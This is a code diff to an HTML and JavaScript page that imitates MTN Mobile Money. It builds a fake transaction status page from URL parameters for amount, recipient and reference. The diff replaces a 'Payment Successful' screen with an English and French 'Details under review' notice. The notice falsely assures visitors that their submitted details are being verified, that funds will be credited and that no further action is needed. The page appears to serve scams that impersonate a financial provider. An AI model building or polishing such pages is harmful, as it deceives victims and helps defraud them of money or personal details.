@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>MTN Mobile Money · Payment Successful</title>
+<title>MTN Mobile Money · Under Review</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -20,6 +20,9 @@
     --mtn-border:#E5E9F0;
     --mtn-soft:  #F5F7FB;
     --mtn-page:  #E7EEF7;
+    --mtn-amber: #D97706;
+    --mtn-amber-soft: #FFF7ED;
+    --mtn-amber-border: #FED7AA;
   }
   * { box-sizing: border-box; margin: 0; padding: 0; }
   html, body { height: 100%; }
@@ -90,26 +93,21 @@
   }
   .tick {
     width: 92px; height: 92px; border-radius: 50%;
-    background: var(--mtn-green);
+    background: var(--mtn-amber);
     display: inline-flex; align-items: center; justify-content: center;
     margin-bottom: 16px;
-    box-shadow: 0 0 0 8px rgba(40,167,69,0.12),
-                0 10px 26px rgba(40,167,69,0.35);
+    box-shadow: 0 0 0 8px rgba(217,119,6,0.12),
+                0 10px 26px rgba(217,119,6,0.35);
     animation: popIn .55s cubic-bezier(.4, 1.4, .6, 1);
   }
   .tick svg {
-    width: 48px; height: 48px;
+    width: 44px; height: 44px;
     stroke: #fff; fill: none;
-    stroke-width: 3.6; stroke-linecap: round; stroke-linejoin: round;
-    stroke-dasharray: 60; stroke-dashoffset: 60;
-    animation: drawCheck .55s ease-out .2s forwards;
+    stroke-width: 2.6; stroke-linecap: round; stroke-linejoin: round;
   }
   @keyframes popIn {
     0%   { transform: scale(0.4); opacity: 0; }
     100% { transform: scale(1);   opacity: 1; }
-  }
-  @keyframes drawCheck {
-    to { stroke-dashoffset: 0; }
   }
   .status-title {
     font-size: 21px; font-weight: 800; letter-spacing: -0.4px;
@@ -120,9 +118,33 @@
     max-width: 320px; margin: 0 auto;
   }
 
+  .review-notice {
+    margin-top: 18px;
+    background: var(--mtn-amber-soft);
+    border: 1px solid var(--mtn-amber-border);
+    border-left: 3px solid var(--mtn-amber);
+    border-radius: 12px;
+    padding: 14px 16px;
+    font-size: 13px;
+    color: #7C2D12;
+    line-height: 1.65;
+    text-align: left;
+  }
+  .review-notice strong {
+    color: #9A3412; font-weight: 800; display: block;
+    margin-bottom: 6px; font-size: 13.5px;
+  }
+  .review-notice .amount-em {
+    font-weight: 800; color: #9A3412;
+  }
+  .review-notice .small-note {
+    display: block; margin-top: 8px;
+    font-size: 12px; color: #9A3412; line-height: 1.55;
+  }
+
   .amount-block {
     display: flex; align-items: baseline; justify-content: center; gap: 8px;
-    margin: 4px 0 18px;
+    margin: 18px 0 18px;
   }
   .amount-block .cur { font-size: 18px; font-weight: 700; color: var(--mtn-royal); }
   .amount-block .val {
@@ -164,7 +186,7 @@
     background: #fff; padding: 3px 8px; border-radius: 5px;
     border: 1px solid var(--mtn-border);
   }
-  .detail-row .v.success { color: var(--mtn-green-dark); font-weight: 800; }
+  .detail-row .v.status-review { color: var(--mtn-amber); font-weight: 800; }
 
   .mtn-footer {
     width: 100%; margin-top: 4px;
@@ -214,7 +236,7 @@
     .brand { font-size: 16px; }
     .page-title { font-size: 17px; }
     .tick { width: 78px; height: 78px; }
-    .tick svg { width: 40px; height: 40px; }
+    .tick svg { width: 38px; height: 38px; }
     .status-title { font-size: 19px; }
     .amount-block .val { font-size: 34px; }
     .close-btn { height: 48px; font-size: 14px; }
@@ -259,18 +281,33 @@
     <div class="top-row">
       <div class="brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
     </div>
-    <div class="page-title" id="pageTitle">Payment Successful</div>
-    <div class="page-sub" id="pageSub">Your transaction has been approved and the funds have been credited.</div>
+    <div class="page-title" id="pageTitle">Details under review</div>
+    <div class="page-sub" id="pageSub">Your details have been submitted successfully and are now being reviewed.</div>
   </div>
 
   <div class="body">
 
     <div class="status-block">
       <div class="tick" aria-hidden="true">
-        <svg viewBox="0 0 24 24"><polyline points="5 12 10 17 19 7"/></svg>
+        <svg viewBox="0 0 24 24">
+          <circle cx="12" cy="12" r="9"/>
+          <path d="M12 7v5l3 2"/>
+        </svg>
       </div>
-      <div class="status-title" id="statusTitle">Credited Successfully</div>
-      <div class="status-desc" id="statusDesc">Your payment has been approved. A confirmation SMS has been sent to your phone.</div>
+      <div class="status-title" id="statusTitle">Details under review</div>
+      <div class="status-desc" id="statusDesc">We are reviewing your submission. Once approved, the total amount will be credited to your MTN MoMo account.</div>
+    </div>
+
+    <div class="review-notice" id="reviewNotice">
+      <strong id="reviewNoticeTitle">What happens next?</strong>
+      <span id="reviewNoticeBody">
+        Your confirmation has been received. Our team is verifying the transaction.
+        The total amount of <span class="amount-em" id="reviewAmount">—</span> will be credited to your MTN MoMo account
+        <strong>once the review is complete</strong>.
+      </span>
+      <span class="small-note" id="reviewNoticeNote">
+        This usually takes a few minutes. You will receive an SMS from MTN Mobile Money as soon as the amount is credited. No further action is needed from you.
+      </span>
     </div>
 
     <div class="amount-block">
@@ -301,20 +338,20 @@
 <div class="toast" id="toast"></div>
 
 <script>
-  /* ═══════════════════════════════════════════════════════════
-     TRANSLATIONS
-  ═══════════════════════════════════════════════════════════ */
   const I18N = {
     en: {
-      docTitle: 'Payment Successful · MTN Mobile Money',
+      docTitle: 'Details under review · MTN Mobile Money',
       copyReceipt: 'Copy Receipt',
       print: 'Print',
       copied: 'Copied ✓',
       copyToast: 'Receipt copied to clipboard.',
-      pageTitle: 'Payment Successful',
-      pageSub: 'Your transaction has been approved and the funds have been credited.',
-      statusTitle: 'Credited Successfully',
-      statusDesc: 'Your payment has been approved. A confirmation SMS has been sent to your phone.',
+      pageTitle: 'Details under review',
+      pageSub: 'Your details have been submitted successfully and are now being reviewed.',
+      statusTitle: 'Details under review',
+      statusDesc: 'We are reviewing your submission. Once approved, the total amount will be credited to your MTN MoMo account.',
+      reviewNoticeTitle: 'What happens next?',
+      reviewNoticeBody: 'Your confirmation has been received. Our team is verifying the transaction. The total amount of <span class="amount-em" id="reviewAmount">—</span> will be credited to your MTN MoMo account <strong>once the review is complete</strong>.',
+      reviewNoticeNote: 'This usually takes a few minutes. You will receive an SMS from MTN Mobile Money as soon as the amount is credited. No further action is needed from you.',
       toLabel: 'To',
       needHelp: 'Need help?',
       callLabel: 'Call',
@@ -326,8 +363,8 @@
       kService: 'Service',
       kMarketed: 'Marketed',
       kStatus: 'Status',
-      vCompleted: 'Payment Completed Successfully',
-      receiptTitle: 'MTN Mobile Money — Payment Successful',
+      vUnderReview: 'Details under review',
+      receiptTitle: 'MTN Mobile Money — Details Under Review',
       receiptStatus: 'Status',
       receiptAmount: 'Amount',
       receiptRecipient: 'Recipient',
@@ -339,15 +376,18 @@
       receiptDate: 'Date'
     },
     fr: {
-      docTitle: 'Paiement réussi · MTN Mobile Money',
+      docTitle: 'Détails en cours de vérification · MTN Mobile Money',
       copyReceipt: 'Copier le reçu',
       print: 'Imprimer',
       copied: 'Copié ✓',
       copyToast: 'Reçu copié dans le presse-papiers.',
-      pageTitle: 'Paiement réussi',
-      pageSub: 'Votre transaction a été approuvée et les fonds ont été crédités.',
-      statusTitle: 'Crédité avec succès',
-      statusDesc: 'Votre paiement a été approuvé. Un SMS de confirmation a été envoyé sur votre téléphone.',
+      pageTitle: 'Détails en cours de vérification',
+      pageSub: 'Vos détails ont été soumis avec succès et sont maintenant en cours de vérification.',
+      statusTitle: 'Détails en cours de vérification',
+      statusDesc: 'Nous vérifions votre soumission. Une fois approuvé, le montant total sera crédité sur votre compte MTN MoMo.',
+      reviewNoticeTitle: 'Que se passe-t-il ensuite ?',
+      reviewNoticeBody: 'Votre confirmation a été reçue. Notre équipe vérifie la transaction. Le montant total de <span class="amount-em" id="reviewAmount">—</span> sera crédité sur votre compte MTN MoMo <strong>une fois la vérification terminée</strong>.',
+      reviewNoticeNote: 'Cela prend généralement quelques minutes. Vous recevrez un SMS de MTN Mobile Money dès que le montant sera crédité. Aucune action supplémentaire n\'est requise de votre part.',
       toLabel: 'À',
       needHelp: 'Besoin d\'aide ?',
       callLabel: 'Appelez le',
@@ -359,8 +399,8 @@
       kService: 'Service',
       kMarketed: 'Commercialisé par',
       kStatus: 'Statut',
-      vCompleted: 'Paiement effectué avec succès',
-      receiptTitle: 'MTN Mobile Money — Paiement réussi',
+      vUnderReview: 'Détails en cours de vérification',
+      receiptTitle: 'MTN Mobile Money — Détails en cours de vérification',
       receiptStatus: 'Statut',
       receiptAmount: 'Montant',
       receiptRecipient: 'Destinataire',
@@ -391,9 +431,6 @@
     dt:  urlParams.get('dt') || ''
   };
 
-  /* ═══════════════════════════════════════════════════════════
-     SUPPORT NUMBERS + CURRENCY LOCALES
-  ═══════════════════════════════════════════════════════════ */
   const SUPPORT_NUMBERS = {
     'Cameroon': '8787',
     'Zambia': '111',
@@ -445,9 +482,6 @@
     t._timer = setTimeout(() => t.classList.remove('show'), 2200);
   }
 
-  /* ═══════════════════════════════════════════════════════════
-     APPLY TRANSLATIONS
-  ═══════════════════════════════════════════════════════════ */
   function applyTranslations() {
     document.title = T.docTitle;
     document.getElementById('copyLbl').textContent = T.copyReceipt;
@@ -456,31 +490,30 @@
     document.getElementById('pageSub').textContent = T.pageSub;
     document.getElementById('statusTitle').textContent = T.statusTitle;
     document.getElementById('statusDesc').textContent = T.statusDesc;
+    document.getElementById('reviewNoticeTitle').textContent = T.reviewNoticeTitle;
+    document.getElementById('reviewNoticeBody').innerHTML = T.reviewNoticeBody;
+    document.getElementById('reviewNoticeNote').textContent = T.reviewNoticeNote;
     document.getElementById('recipientLabel').textContent = T.toLabel;
     document.getElementById('needHelpLabel').textContent = T.needHelp;
     document.getElementById('callLabel').textContent = T.callLabel;
     document.getElementById('closeBtn').textContent = T.close;
   }
 
-  /* ═══════════════════════════════════════════════════════════
-     RENDER
-  ═══════════════════════════════════════════════════════════ */
   function render() {
     applyTranslations();
 
-    /* Amount */
+    const amtFull = tx.am ? formatAmount(tx.am, tx.cur) : '—';
+
     document.getElementById('amtCur').textContent = (tx.cur || '').toUpperCase();
     document.getElementById('amtVal').textContent =
       tx.am ? formatAmount(tx.am, tx.cur).replace(' ' + tx.cur, '') : '0.00';
 
-    /* Recipient */
+    const reviewAmt = document.getElementById('reviewAmount');
+    if (reviewAmt) reviewAmt.textContent = amtFull;
+
     document.getElementById('reqRecipient').textContent = tx.rn || '—';
+    document.getElementById('supportNum').textContent = SUPPORT_NUMBERS[tx.c] || '—';
 
-    /* Support */
-    document.getElementById('supportNum').textContent =
-      SUPPORT_NUMBERS[tx.c] || '—';
-
-    /* Detail rows */
     const rows = [
       { k: T.kCountry,         v: tx.c },
       { k: T.kTransactionId,   v: tx.ref, mono: true },
@@ -488,7 +521,7 @@
       { k: T.kPaymentMethod,   v: tx.pm },
       { k: T.kService,         v: tx.sn },
       { k: T.kMarketed,        v: tx.mk },
-      { k: T.kStatus,          v: T.vCompleted, cls: 'success' }
+      { k: T.kStatus,          v: T.vUnderReview, cls: 'status-review' }
     ];
 
     let html = '';
@@ -506,15 +539,13 @@
     }[c]));
   }
 
-  /* ═══════════════════════════════════════════════════════════
-     COPY RECEIPT
-  ═══════════════════════════════════════════════════════════ */
   function copyReceipt() {
+    const amtFull = tx.am ? formatAmount(tx.am, tx.cur) : '—';
     const lines = [
       T.receiptTitle,
       '=====================================',
-      T.receiptStatus + ': ' + T.vCompleted,
-      T.receiptAmount + ': ' + (tx.am ? formatAmount(tx.am, tx.cur) : '—'),
+      T.receiptStatus + ': ' + T.vUnderReview,
+      T.receiptAmount + ': ' + amtFull,
       T.receiptRecipient + ': ' + (tx.rn || ''),
       T.receiptCountry + ': '   + (tx.c || ''),
       T.receiptTxId + ': ' + (tx.ref || ''),
@@ -544,9 +575,6 @@
     document.body.removeChild(ta);
   }
 
-  /* ═══════════════════════════════════════════════════════════
-     CLOSE → return to payment link
-  ═══════════════════════════════════════════════════════════ */
   function closePage() {
     if (tx.ref) {
       try {
